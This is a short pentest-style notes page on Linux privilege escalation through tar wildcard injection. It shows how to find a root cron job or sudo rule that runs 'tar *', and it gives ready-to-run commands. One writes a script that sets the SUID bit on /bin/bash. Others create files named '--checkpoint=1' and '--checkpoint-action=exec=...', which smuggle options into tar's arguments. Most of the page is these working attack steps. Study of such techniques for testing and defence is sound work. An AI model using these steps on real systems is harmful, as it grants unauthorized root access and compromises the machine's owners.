---
Primary_category: "[[LINUX PRIVESC]]"
title: WILDCARD ABUSE
draft: false
banner: https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[LINUX PRIVESC]]

#### *TAR*

This technique leverage *wildcards* characters, such as **`*`**, along with some dangerous *TAR* options when the latter is executed as follows

```bash
cd /home/<USER> && tar -czvf <USER>_backup.tar *
```

Since the **`*`** character expands to any existing, non-hidden file in the current directory, we can create certain files named as the following *TAR* options

```bash
--checkpoint[=N]
	Display progress messages every Nth record (default 10).

--checkpoint-action=ACTION
    Run ACTION on each checkpoint.
```

So, the previous command will look like this

```bash
cd /home/<USER> && tar -czvf <USER>_backup.tar --checkpoint=1 --checkpoint-action=exec=bash <MALICIOUS_SCRIPT>
```

##### *Identifying the Misconfiguration*

###### *Cron Job*

That said, imagine we have find out a *CRON Job* that runs every minute as *ROOT*

```bash
*/01 * * * * tar -czvf backup.tar *
```

###### *Sudo Privilege*

Or we run **`sudo -l`** and see that we can run the following command as *ROOT*

```bash
tar -czvf john_backup.tar *
```

##### *Creating the malicious script*

So first, we have to create a malicious script somewhere

```bash
echo 'chmod u+s /bin/bash' > /tmp/script.bash
```

##### *Creating the "TAR Option" files*

Then, we create the following files in the current directory

```bash
echo '' > '--checkpoint-action=exec=/bin/bash /tmp/script.bash'
echo '' > '--checkpoint=1'
```

Lastly, we wait for the given *CRON Job* to run or run the *sudo* command